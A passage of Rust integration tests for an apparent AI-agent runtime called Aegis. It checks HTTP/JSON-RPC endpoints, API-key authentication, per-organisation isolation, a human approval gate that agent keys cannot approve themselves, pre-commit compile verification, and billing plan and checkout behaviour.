                json!({ "escalation_id": esc_id, "ttl_secs": 3600 }),
            )
            .await
            .unwrap();

        let commit_ok = kernel
            .call_tool(&coder, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(commit_ok["status"], "committed_to_host");

        kernel
            .call_tool(
                &coder,
                "ipc_reply",
                json!({
                    "msg_id": req_msg_id,
                    "success": true,
                    "payload": { "committed_files": ["lib.rs"] }
                }),
            )
            .await
            .unwrap();

        let researcher_inbox = kernel
            .call_tool(&researcher, "ipc_recv", json!({ "unread_only": true }))
            .await
            .unwrap();
        assert_eq!(researcher_inbox["messages_count"], 1);
    }

    #[tokio::test]
    async fn test_http_daemon_and_jsonrpc_handler() {
        let temp = tempfile::tempdir().unwrap();
        let host_project = temp.path().join("host_repo");
        let runtime_root = temp.path().join("aegis_runtime");
        tokio::fs::create_dir_all(&host_project).await.unwrap();
        tokio::fs::write(host_project.join("main.rs"), "fn main() {}\n")
            .await
            .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", host_project)
            .await
            .unwrap();
        let op = kernel.operator_token();
        assert!(op.starts_with("aop_"), "an operator token is generated when none is configured");

        // Identity headers alone carry no authority: anonymous /mcp is rejected.
        let mut anon = tokio::net::TcpStream::connect(addr).await.unwrap();
        anon.write_all(
            format!("POST /mcp HTTP/1.1\r\nHost: {addr}\r\nX-Aegis-Org: acme\r\nX-Aegis-Agent: agy-agent\r\nContent-Length: 2\r\n\r\n{{}}").as_bytes(),
        )
        .await
        .unwrap();
        let mut anon_resp = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut anon, &mut anon_resp).await.unwrap();
        assert!(String::from_utf8_lossy(&anon_resp).starts_with("HTTP/1.1 401"));

        // Connect over TCP and send a POST /mcp JSON-RPC initialize request
        let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let rpc_body = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize"
        })
        .to_string();
        let http_req = format!(
            "POST /mcp HTTP/1.1\r\nHost: {}\r\nAuthorization: Bearer {}\r\nX-Aegis-Org: acme\r\nX-Aegis-Agent: agy-agent\r\nContent-Length: {}\r\n\r\n{}",
            addr,
            op,
            rpc_body.len(),
            rpc_body
        );
        stream.write_all(http_req.as_bytes()).await.unwrap();

        let mut resp_buf = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut resp_buf)
            .await
            .unwrap();
        let resp_str = String::from_utf8_lossy(&resp_buf);
        assert!(resp_str.contains("200 OK"));
        assert!(resp_str.contains("aegis-os-runtime"));

        // Verify Google A2A discovery endpoint `GET /.well-known/agent.json`
        let mut a2a_stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let card_req = format!(
            "GET /.well-known/agent.json HTTP/1.1\r\nHost: {}\r\n\r\n",
            addr
        );
        a2a_stream.write_all(card_req.as_bytes()).await.unwrap();
        let mut card_buf = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut a2a_stream, &mut card_buf)
            .await
            .unwrap();
        let card_str = String::from_utf8_lossy(&card_buf);
        assert!(card_str.contains("200 OK"));
        assert!(card_str.contains("aegis-os-workstation-gateway"));
        assert!(card_str.contains("acme/agy-agent"));

        // Verify Google A2A `POST /a2a` `tasks/send` & `tasks/get`
        let mut task_stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let send_body = json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tasks/send",
            "params": {
                "to_agent": "acme/agy-agent",
                "subject": "Verify A2A endpoint",
                "payload": { "context_id": "ctx-http-a2a" }
            }
        })
        .to_string();
        let send_req = format!(
            "POST /a2a HTTP/1.1\r\nHost: {}\r\nAuthorization: Bearer {}\r\nX-Aegis-Org: acme\r\nX-Aegis-Agent: agy-agent\r\nContent-Length: {}\r\n\r\n{}",
            addr,
            op,
            send_body.len(),
            send_body
        );
        task_stream.write_all(send_req.as_bytes()).await.unwrap();
        let mut send_buf = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut task_stream, &mut send_buf)
            .await
            .unwrap();
        let send_str = String::from_utf8_lossy(&send_buf);
        assert!(send_str.contains("200 OK"));
        assert!(send_str.contains("\"state\":\"submitted\""));
        assert!(send_str.contains("ctx-http-a2a"));
    }

    #[tokio::test]
    async fn a2a_cancel_revokes_memory_sessions_end_to_end() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let mut kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();

        let memory_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let memory_addr = memory_listener.local_addr().unwrap();
        let (tx, rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            let (mut socket, _) = memory_listener.accept().await.unwrap();
            let mut buf = vec![0u8; 8192];
            let read = tokio::io::AsyncReadExt::read(&mut socket, &mut buf)
                .await
                .unwrap();
            let request = String::from_utf8_lossy(&buf[..read]).to_string();
            assert!(request.contains("POST /v1/sessions/revoke-by-task"));
            assert!(request.to_lowercase().contains("x-aegis-task-token: msg-"));
            let body = r#"{"status":"revoked","count":1}"#;
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
                body.len(),
                body
            );
            tokio::io::AsyncWriteExt::write_all(&mut socket, response.as_bytes())
                .await
                .unwrap();
            let _ = tx.send(());
        });
        kernel.memory_url = Some(format!("http://{memory_addr}"));
        kernel.memory_task_secret = Some("test-secret".to_string());
        kernel.memory_bridge_token = None;

        let task = kernel
            .ipc
            .send(IpcEnvelope {
                msg_id: String::new(),
                org_id: "acme".to_string(),
                from_agent: "acme/planner".to_string(),
                to_target: "worker".to_string(),
                kind: IpcKind::TaskRequest {
                    timeout_secs: Some(60),
                },
                subject: "e2e cancel".to_string(),
                payload: json!({}),
                attachments: vec![],
                status: MessageDeliveryStatus::Unread,
                created_at_ms: 0,
            })
            .await
            .unwrap();
        // Use a stable task id for the mock assertion.
        let task_id = task.msg_id;
        let kernel = Arc::new(kernel);
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", repo)
            .await
            .unwrap();
        let op = kernel.operator_token();
        let body = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tasks/cancel",
            "params": { "id": task_id }
        })
        .to_string();
        let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let request = format!(
            "POST /v1/a2a HTTP/1.1\r\nHost: {addr}\r\nAuthorization: Bearer {op}\r\nX-Aegis-Org: acme\r\nX-Aegis-Agent: planner\r\nContent-Length: {}\r\n\r\n{}",
            body.len(),
            body
        );
        tokio::io::AsyncWriteExt::write_all(&mut stream, request.as_bytes())
            .await
            .unwrap();
        let mut response = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut response)
            .await
            .unwrap();
        let response = String::from_utf8_lossy(&response);
        assert!(response.contains("200 OK"), "{response}");
        assert!(response.contains("\"state\":\"canceled\""), "{response}");
        tokio::time::timeout(std::time::Duration::from_secs(5), rx)
            .await
            .unwrap()
            .unwrap();
    }

    #[tokio::test]
    async fn terminal_task_sends_task_scoped_memory_revoke() {
        let temp = tempfile::tempdir().unwrap();
        let mut kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let (tx, rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 8192];
            let read = tokio::io::AsyncReadExt::read(&mut socket, &mut buf)
                .await
                .unwrap();
            let request = String::from_utf8_lossy(&buf[..read]).to_string();
            assert!(request.contains("POST /v1/sessions/revoke-by-task"));
            assert!(request.to_lowercase().contains("x-aegis-task-token: task-1:"));
            let body = r#"{"status":"revoked","count":1}"#;
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
                body.len(),
                body
            );
            tokio::io::AsyncWriteExt::write_all(&mut socket, response.as_bytes())
                .await
                .unwrap();
            let _ = tx.send(());
        });
        kernel.memory_url = Some(format!("http://{addr}"));
        kernel.memory_task_secret = Some("test-secret".to_string());
        kernel.memory_bridge_token = None;
        kernel.revoke_memory_for_task("task-1").await;
        tokio::time::timeout(std::time::Duration::from_secs(5), rx)
            .await
            .unwrap()
            .unwrap();
    }

    #[tokio::test]
    async fn a2a_tasks_are_org_scoped_across_http_and_status() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let kernel = Arc::new(AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap());
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", repo)
            .await
            .unwrap();
        let (org_a_key, _) = kernel
            .paas
            .issue_api_key("org-a", "agent-a", "Engineer", None, "test")
            .await
            .unwrap();
        let (org_b_key, _) = kernel
            .paas
            .issue_api_key("org-b", "agent-b", "Engineer", None, "test")
            .await
            .unwrap();

        let requester = AgentIdentity::new("org-b", "requester", "Planner");
        let assignee = AgentIdentity::new("org-b", "assignee", "Worker");
        kernel
            .ipc
            .register_peer(&requester, vec!["*".to_string()])
            .await
            .unwrap();
        kernel
            .ipc
            .register_peer(&assignee, vec!["*".to_string()])
            .await
            .unwrap();
        let task = kernel
            .ipc
            .send(IpcEnvelope {
                msg_id: String::new(),
                org_id: "org-b".to_string(),
                from_agent: "org-b/requester".to_string(),
                to_target: "assignee".to_string(),
                kind: IpcKind::TaskRequest {
                    timeout_secs: Some(60),
                },
                subject: "org-b secret task".to_string(),
                payload: json!({ "secret": "do-not-leak" }),
                attachments: vec![],
                status: MessageDeliveryStatus::Unread,
                created_at_ms: 0,
            })
            .await
            .unwrap();
        let task_id = task.msg_id;

        let get = |key: &str, id: String| {
            let key = key.to_string();
            async move {
                raw_http(
                    addr,
                    "POST",
                    "/v1/a2a",
                    Some(&key),
                    Some(json!({
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tasks/get",
                        "params": { "id": id }
                    })),
                )
                .await
            }
        };

        let (owner_head, owner_body) = get(org_b_key.as_str(), task_id.clone()).await;
        assert!(owner_head.contains("200 OK"), "{owner_head}");
        assert_eq!(owner_body["result"]["id"], task_id);
        assert_eq!(owner_body["result"]["org_id"], "org-b");

        let (cross_head, cross_body) = get(org_a_key.as_str(), task_id.clone()).await;
        assert!(cross_head.contains("200 OK"), "{cross_head}");
        assert_eq!(cross_body["error"]["code"], -32004);
        assert!(!cross_body.to_string().contains("do-not-leak"));

        let (_, unknown_body) = get(org_a_key.as_str(), "task-does-not-exist".to_string()).await;
        assert_eq!(cross_body["error"]["code"], unknown_body["error"]["code"]);

        let (_, list_a) = raw_http(
            addr,
            "POST",
            "/v1/a2a",
            Some(&org_a_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tasks/list",
                "params": {}
            })),
        )
        .await;
        assert!(list_a["result"]["tasks"]
            .as_array()
            .unwrap()
            .iter()
            .all(|task| task["org_id"] != "org-b"));

        let (_, list_b) = raw_http(
            addr,
            "POST",
            "/v1/a2a",
            Some(&org_b_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tasks/list",
                "params": {}
            })),
        )
        .await;
        assert!(list_b["result"]["tasks"]
            .as_array()
            .unwrap()
            .iter()
            .any(|task| task["id"] == task_id));

        let (_, status_a) = raw_http(addr, "GET", "/api/status", Some(&org_a_key), None).await;
        assert!(status_a["a2a_tasks"]
            .as_array()
            .unwrap()
            .iter()
            .all(|task| task["org_id"] != "org-b"));

        let (_, status_b) = raw_http(addr, "GET", "/api/status", Some(&org_b_key), None).await;
        assert!(status_b["a2a_tasks"]
            .as_array()
            .unwrap()
            .iter()
            .any(|task| task["id"] == task_id));

        // A tenant whose org id is literally `default-org` must not be widened to `*` when the
        // request omits `org_id`. This used to expose every org's peers/tasks/secrets.
        let (default_org_key, _) = kernel
            .paas
            .issue_api_key("default-org", "default-agent", "Engineer", None, "test")
            .await
            .unwrap();
        let (_, default_status) =
            raw_http(addr, "GET", "/api/status", Some(&default_org_key), None).await;
        assert_eq!(default_status["org_id"], "default-org");
        assert!(default_status["a2a_tasks"]
            .as_array()
            .unwrap()
            .iter()
            .all(|task| task["org_id"] != "org-b"));
        assert!(default_status["peers"]
            .as_array()
            .unwrap()
            .iter()
            .all(|peer| peer["org_id"] != "org-b"));
        assert!(default_status["global_peers"]
            .as_array()
            .unwrap()
            .is_empty());

        let (_, cancel_cross) = raw_http(
            addr,
            "POST",
            "/v1/a2a",
            Some(&org_a_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 4,
                "method": "tasks/cancel",
                "params": { "id": task_id }
            })),
        )
        .await;
        assert_eq!(cancel_cross["error"]["code"], -32004);
        let (_, after_cross_cancel) = get(org_b_key.as_str(), task_id.clone()).await;
        assert_eq!(after_cross_cancel["result"]["state"], "submitted");
    }

    #[tokio::test]
    async fn test_paas_api_key_auth_cloud_workspace_pr_and_dashboard_approval() {
        let temp = tempfile::tempdir().unwrap();
        let source_repo = temp.path().join("source_repo");
        let runtime_root = temp.path().join("aegis_runtime");
        tokio::fs::create_dir_all(&source_repo).await.unwrap();
        tokio::fs::write(source_repo.join("lib.rs"), "pub fn compute() -> i32 { 10 }\n")
            .await
            .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", source_repo.clone())
            .await
            .unwrap();
        let op = kernel.operator_token();

        async fn http_call(
            addr: std::net::SocketAddr,
            method: &str,
            path: &str,
            auth: Option<&str>,
            body: Option<Value>,
        ) -> (String, Value) {
            let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
            let body_str = body.map(|b| b.to_string()).unwrap_or_default();
            let auth_hdr = auth
                .map(|a| format!("Authorization: Bearer {}\r\n", a))
                .unwrap_or_default();
            let req = format!(
                "{} {} HTTP/1.1\r\nHost: {}\r\n{}Content-Length: {}\r\n\r\n{}",
                method,
                path,
                addr,
                auth_hdr,
                body_str.len(),
                body_str
            );
            stream.write_all(req.as_bytes()).await.unwrap();
            let mut buf = Vec::new();
            tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut buf)
                .await
                .unwrap();
            let raw = String::from_utf8_lossy(&buf).to_string();
            let (head, b) = raw.split_once("\r\n\r\n").unwrap_or((&raw, "{}"));
            let parsed = serde_json::from_str::<Value>(b).unwrap_or_else(|_| json!({ "html": b }));
            (head.to_string(), parsed)
        }

        // 1. Verify Embedded Minimalist Web Console (`GET /dashboard`) and simulation endpoint (`POST /v1/approvals/simulate`)
        let (dash_head, dash_body) = http_call(addr, "GET", "/dashboard", None, None).await;
        assert!(dash_head.contains("200 OK"));
        assert!(dash_head.contains("text/html"));
        let html_str = dash_body["html"].as_str().unwrap();
        assert!(html_str.contains("Aegis Cloud — Developer Console"));
        assert!(html_str.contains("<svg"));
        assert!(!html_str.chars().any(|c| ('\u{1F300}'..='\u{1FAFF}').contains(&c)));

        // 1b. Verify Commercial Plan Tier (`POST /v1/tenants/plan`) & Concurrency Quota Enforcement
        let (plan_head, plan_resp) = http_call(
            addr,
            "POST",
            "/v1/tenants/plan",
            Some(&op),
            Some(json!({ "org_id": "acme-cloud", "plan_tier": "community" })),
        )
        .await;
        assert!(plan_head.contains("200 OK"));
        assert_eq!(plan_resp["monthly_price_usd"], 0);
        assert_eq!(plan_resp["tenant"]["max_concurrent_agents"], 1);

        // Requesting 3 agents on Community plan (max 1) must fail
        let (over_head, over_resp) = http_call(
            addr,
            "POST",
            "/v1/workspaces",
            Some(&op),
            Some(json!({
                "org_id": "acme-cloud",
                "workspace_id": "ws-over-quota",
                "source_url": source_repo.to_string_lossy(),
                "agents": ["a1", "a2", "a3"]
            })),
        )
        .await;
        assert!(over_head.contains("500 Internal Server Error"));
        assert!(over_resp["error"].as_str().unwrap().contains("at most 1 concurrent cloud agents"));

        // Upgrade tenant to Pro ($29/mo, max 8 agents)
        let (_, up_resp) = http_call(
            addr,
            "POST",
            "/v1/tenants/plan",
            Some(&op),
            Some(json!({ "org_id": "acme-cloud", "plan_tier": "pro" })),
        )
        .await;
        assert_eq!(up_resp["monthly_price_usd"], 29);
        assert_eq!(up_resp["tenant"]["max_concurrent_agents"], 8);

        let (sim_head, sim_resp) = http_call(
            addr,
            "POST",
            "/v1/approvals/simulate",
            Some(&op),
            Some(json!({ "org_id": "acme-cloud", "agent_id": "demo-agent" })),
        )
        .await;
        assert!(sim_head.contains("200 OK"));
        assert_eq!(sim_resp["status"], "simulated");
        let sim_esc_id = sim_resp["escalation_id"].as_str().unwrap();
        let (_, deny_resp) = http_call(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({ "escalation_id": sim_esc_id, "decision": "deny" })),
        )
        .await;
        assert_eq!(deny_resp["status"], "denied");

        // 2. Provision a Cloud Workspace (`POST /v1/workspaces`) with 2 parallel CoW agent branches
        let (ws_head, ws_resp) = http_call(
            addr,
            "POST",
            "/v1/workspaces",
            Some(&op),
            Some(json!({
                "org_id": "acme-cloud",
                "workspace_id": "ws-billing",
                "source_url": source_repo.to_string_lossy(),
                "branch": "main",
                "agents": ["coder-alpha", "reviewer-beta"]
            })),
        )
        .await;
        assert!(ws_head.contains("200 OK"));
        assert_eq!(ws_resp["status"], "provisioned");

        // 3. Mint a scoped `ak_live_*` API key (`POST /v1/tenants/keys`) bound to `ws-billing`
        let (_, key_resp) = http_call(
            addr,
            "POST",
            "/v1/tenants/keys",
            Some(&op),
            Some(json!({
                "org_id": "acme-cloud",
                "agent_id": "coder-alpha",
                "workspace_id": "ws-billing",
                "label": "CI Cloud Key"
            })),
        )
        .await;
        let api_key = key_resp["api_key"].as_str().unwrap().to_string();
        assert!(api_key.starts_with("ak_live_"));

        // 4. Reject forged API key with `401 Unauthorized`
        let (bad_head, _) = http_call(
            addr,
            "POST",
            "/v1/mcp",
            Some("ak_live_forged_invalid_token"),
            Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize" })),
        )
        .await;
        assert!(bad_head.contains("401 Unauthorized"));

        // 5. Modify `lib.rs` in `coder-alpha`'s CoW shadow workspace via authenticated `POST /v1/mcp`
        let (edit_head, _) = http_call(
            addr,
            "POST",
            "/v1/mcp",
            Some(&api_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {
                    "name": "fs_edit",
                    "arguments": {
                        "path": "lib.rs",
                        "target": "pub fn compute() -> i32 { 10 }",
                        "replacement": "pub fn compute() -> i32 { 42 }"
                    }
                }
            })),
        )
        .await;
        assert!(edit_head.contains("200 OK"));

        // 5b. Verify Scale-to-Zero Hibernation (`POST /v1/workspaces/hibernate`) & Instant Wake (`POST /v1/workspaces/wake`)
        let (hib_head, hib_resp) = http_call(
            addr,
            "POST",
            "/v1/workspaces/hibernate",
            Some(&api_key),
            Some(json!({ "org_id": "acme-cloud", "workspace_id": "ws-billing" })),
        )
        .await;
        assert!(hib_head.contains("200 OK"));
        assert_eq!(hib_resp["status"], "hibernated");
        assert_eq!(hib_resp["scale_to_zero"], true);

        // Verify source-only diff inspection (`GET /v1/workspaces/diff`) automatically wakes the hibernated workspace
        // and returns `unified_diff` + `changed_source_files` while preserving the uncommitted CoW edit!
        let (diff_head, diff_resp) = http_call(
            addr,
            "GET",
            "/v1/workspaces/diff?org_id=acme-cloud&agent_id=coder-alpha&workspace_id=ws-billing",
            Some(&api_key),
            None,
        )
        .await;
        assert!(diff_head.contains("200 OK"));
        assert_eq!(diff_resp["changes_count"], 1);
        assert!(diff_resp["unified_diff"]
            .as_str()
            .unwrap()
            .contains("+pub fn compute() -> i32 { 42 }"));
        assert_eq!(
            diff_resp["changed_source_files"][0]["path"].as_str().unwrap(),
            "lib.rs"
        );

        // 6. Trigger `workspace_commit` -> hits HITL approval gate -> approve via `/v1/approvals/decide`
        let (_, commit_ask) = http_call(
            addr,
            "POST",
            "/v1/mcp",
            Some(&api_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tools/call",
                "params": {
                    "name": "workspace_commit",
                    "arguments": {}
                }
            })),
        )
        .await;
        let ask_text = commit_ask["result"]["content"][0]["text"].as_str().unwrap();
        let ask_json: Value = serde_json::from_str(ask_text).unwrap();
        assert_eq!(ask_json["status"], "approval_required");
        let esc_id = ask_json["escalation_id"].as_str().unwrap();

        // The tenant key is what agents hold: it must not approve escalations, see other orgs, or
        // act on another org's resources.
        let (self_approve_head, _) = http_call(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&api_key),
            Some(json!({ "escalation_id": esc_id, "decision": "approve" })),
        )
        .await;
        assert!(self_approve_head.contains("403 Forbidden"), "{self_approve_head}");
        let (all_orgs_head, _) =
            http_call(addr, "GET", "/api/status?org_id=*", Some(&api_key), None).await;
        assert!(all_orgs_head.contains("403 Forbidden"), "{all_orgs_head}");
        let (cross_head, _) = http_call(
            addr,
            "POST",
            "/v1/workspaces/hibernate",
            Some(&api_key),
            Some(json!({ "org_id": "victim-org", "workspace_id": "ws-x" })),
        )
        .await;
        assert!(cross_head.contains("403 Forbidden"), "{cross_head}");
        let (anon_mint_head, _) = http_call(
            addr,
            "POST",
            "/v1/tenants/keys",
            None,
            Some(json!({ "org_id": "acme-cloud", "agent_id": "intruder" })),
        )
        .await;
        assert!(anon_mint_head.contains("403 Forbidden"), "{anon_mint_head}");

        let (app_head, app_resp) = http_call(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({
                "escalation_id": esc_id,
                "decision": "approve",
                "ttl_secs": 3600
            })),
        )
        .await;
        assert!(app_head.contains("200 OK"));
        assert_eq!(app_resp["status"], "approved");

        // 7. Export Git branch, commit SHA, unified patch, and GitHub PR payload (`POST /v1/workspaces/pr`)
        let (pr_head, pr_resp) = http_call(
            addr,
            "POST",
            "/v1/workspaces/pr",
            Some(&api_key),
            Some(json!({
                "org_id": "acme-cloud",
                "workspace_id": "ws-billing",
                "agent_id": "coder-alpha",
                "branch_name": "aegis/coder-alpha/fix-compute",
                "commit_title": "feat(billing): update compute() return value to 42"
            })),
        )
        .await;
        assert!(pr_head.contains("200 OK"));
        assert_eq!(pr_resp["status"], "pr_bundle_exported");
        assert_eq!(pr_resp["git_branch"], "aegis/coder-alpha/fix-compute");
        assert!(!pr_resp["git_commit_sha"].as_str().unwrap().is_empty());
        assert!(pr_resp["unified_patch"]
            .as_str()
            .unwrap()
            .contains("+pub fn compute() -> i32 { 42 }"));
    }

    #[tokio::test]
    async fn test_pre_commit_semantic_verification_gate() {
        if std::env::var_os("AOS_SANDBOX_ID").is_some() {
            std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        }
        let temp = tempfile::tempdir().unwrap();
        let host_repo = temp.path().join("host_repo");
        let rt_dir = temp.path().join("rt");
        tokio::fs::create_dir_all(&host_repo).await.unwrap();
        let baseline_code = "pub fn calc_fee(amount: u64) -> u64 { amount / 100 }\n\
                             // anchor1\n\
                             // anchor2\n\
                             pub fn calc_tax(amount: u64) -> u64 { amount / 20 }\n";
        tokio::fs::write(host_repo.join("lib.rs"), baseline_code)
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&rt_dir).await.unwrap();
        let agy = AgentIdentity::new("sem-org", "agy-agent", "Lead");
        let codex = AgentIdentity::new("sem-org", "codex-cli", "Coder");
        for id in [&agy, &codex] {
            kernel
                .ensure_agent_environment(
                    id.clone(),
                    &host_repo,
                    IsolationTier::NativeOsSandbox,
                    vec!["*".to_string()],
                )
                .await
                .unwrap();
            kernel
                .call_tool(
                    id,
                    "policy_grant_lease",
                    json!({ "action_pattern": "workspace_commit", "ttl_secs": 3600 }),
                )
                .await
                .unwrap();
        }

        // Agent A (`agy`) renames `calc_fee` -> `calc_service_fee` at line 1 and commits.
        kernel
            .call_tool(
                &agy,
                "fs_edit",
                json!({
                    "path": "lib.rs",
                    "target": "pub fn calc_fee(amount: u64) -> u64 { amount / 100 }",
                    "replacement": "pub fn calc_service_fee(amount: u64) -> u64 { amount / 50 }"
                }),
            )
            .await
            .unwrap();
        kernel
            .call_tool(
                &agy,
                "workspace_commit",
                json!({ "verify_cmd": "rustc --crate-type lib --emit=metadata -o $TMPDIR/lib.rmeta lib.rs" }),
            )
            .await
            .unwrap();

        // Agent B (`codex`), starting from the old baseline, adds a call to the old `calc_fee` at the bottom.
        // Syntactically the hunks are disjoint (Line 1 vs Line 4), so Diff3 merges them cleanly,
        // but semantically `calc_fee` no longer exists!
        kernel
            .call_tool(
                &codex,
                "fs_edit",
                json!({
                    "path": "lib.rs",
                    "target": "pub fn calc_tax(amount: u64) -> u64 { amount / 20 }",
                    "replacement": "pub fn calc_tax(amount: u64) -> u64 { calc_fee(amount) + amount / 20 }"
                }),
            )
            .await
            .unwrap();

        let sem_commit = kernel
            .call_tool(
                &codex,
                "workspace_commit",
                json!({ "verify_cmd": "rustc --crate-type lib --emit=metadata -o $TMPDIR/lib.rmeta lib.rs" }),
            )
            .await;
        assert!(
            sem_commit.is_err(),
            "Expected semantic conflict to be caught by pre-commit verify_cmd gate"
        );

        // Verify the host file remains 100% untouched (still compiles and does NOT contain broken `calc_fee` call)
        let host_after = tokio::fs::read_to_string(host_repo.join("lib.rs"))
            .await
            .unwrap();
        assert!(host_after.contains("pub fn calc_service_fee"));
        assert!(!host_after.contains("calc_fee(amount)"));

        // Now Agent B fixes the call site in its rebased shadow workspace and commits with `verify_cmd` -> succeeds!
        kernel
            .call_tool(
                &codex,
                "fs_edit",
                json!({
                    "path": "lib.rs",
                    "target": "calc_fee(amount)",
                    "replacement": "calc_service_fee(amount)"
                }),
            )
            .await
            .unwrap();
        let fixed_commit = kernel
            .call_tool(
                &codex,
                "workspace_commit",
                json!({ "verify_cmd": "rustc --crate-type lib --emit=metadata -o $TMPDIR/lib.rmeta lib.rs" }),
            )
            .await
            .unwrap();
        assert_eq!(fixed_commit["status"], "committed_to_host");
        assert_eq!(fixed_commit["verification_passed"], true);
    }

    #[tokio::test]
    async fn test_billing_webhook_polar_lemonsqueezy_and_plan_timeout_guardrails() {
        let temp = tempfile::tempdir().unwrap();
        let source_repo = temp.path().join("source_repo");
        let runtime_root = temp.path().join("aegis_runtime");
        tokio::fs::create_dir_all(&source_repo).await.unwrap();
        tokio::fs::write(source_repo.join("lib.rs"), "pub fn ready() -> bool { true }\n")
            .await
            .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let outbox = runtime_root.join("outbox");
        kernel.paas.set_mailer(approver::Mailer::Directory(outbox.clone()), "https://cloud.example");
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", source_repo.clone())
            .await
            .unwrap();

        async fn http_req_with_headers(
            addr: std::net::SocketAddr,
            method: &str,
            path: &str,
            extra_headers: &[(&str, &str)],
            body: Option<Value>,
        ) -> (String, Value) {
            let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
            let body_str = body.map(|b| b.to_string()).unwrap_or_default();
            let mut hdrs = String::new();
            for (k, v) in extra_headers {
                hdrs.push_str(&format!("{}: {}\r\n", k, v));
            }
            let req = format!(
                "{} {} HTTP/1.1\r\nHost: {}\r\n{}Content-Length: {}\r\n\r\n{}",
                method,
                path,
                addr,
                hdrs,
                body_str.len(),
                body_str
            );
            stream.write_all(req.as_bytes()).await.unwrap();
            let mut buf = Vec::new();
            tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut buf)
                .await
                .unwrap();
            let raw = String::from_utf8_lossy(&buf).to_string();
            let (head, b) = raw.split_once("\r\n\r\n").unwrap_or((&raw, "{}"));
            let parsed = serde_json::from_str::<Value>(b).unwrap_or_else(|_| json!({ "raw": b }));
            (head.to_string(), parsed)
        }

        // 1. Verify `/v1/billing/checkout` returns Polar.sh & Lemon Squeezy URLs pre-populated with `org_id` and `email`
        let (chk_head, chk_resp) = http_req_with_headers(
            addr,
            "GET",
            "/v1/billing/checkout?org_id=polar-org&plan=team&email=founder@polar-org.dev",
            &[],
            None,
        )
        .await;
        assert!(chk_head.contains("200 OK"));
        assert_eq!(chk_resp["monthly_price_usd"], 79);
        assert_eq!(chk_resp["max_concurrent_agents"], 32);
        assert_eq!(chk_resp["max_exec_timeout_ms"], 600_000);
        assert!(chk_resp["providers"]["polar_sh"]
            .as_str()
            .unwrap()
            .contains("metadata[org_id]=polar-org"));
        assert!(chk_resp["providers"]["lemonsqueezy"]
            .as_str()
            .unwrap()
            .contains("checkout[custom][org_id]=polar-org"));
        let claim_id = chk_resp["claim_id"].as_str().unwrap().to_string();
        let claim_token = chk_resp["claim_token"].as_str().unwrap().to_string();
        assert!(chk_resp["checkout_url"]
            .as_str()
            .unwrap()
            .contains(&format!("metadata[claim_id]={claim_id}")));
        assert!(!chk_resp["checkout_url"].as_str().unwrap().contains(&claim_token));

        // Someone else starting a checkout for the same org gets a token that can't collect our key.
        let (_, other_chk) = http_req_with_headers(
            addr,
            "GET",
            "/v1/billing/checkout?org_id=polar-org&plan=team",
            &[],
            None,
        )
        .await;
        let other_token = other_chk["claim_token"].as_str().unwrap().to_string();

        // 2. Verify HMAC-SHA256 webhook signature rejection on forged signature
        let webhook_secret = "whsec_polar_test_secret_123";
        kernel.paas.set_secrets("adm_secret_999", webhook_secret);
        let polar_activate = json!({
            "type": "subscription.created",
            "data": {
                "id": "sub_polar_99",
                "customer_email": "founder@polar-org.dev",
                "metadata": {
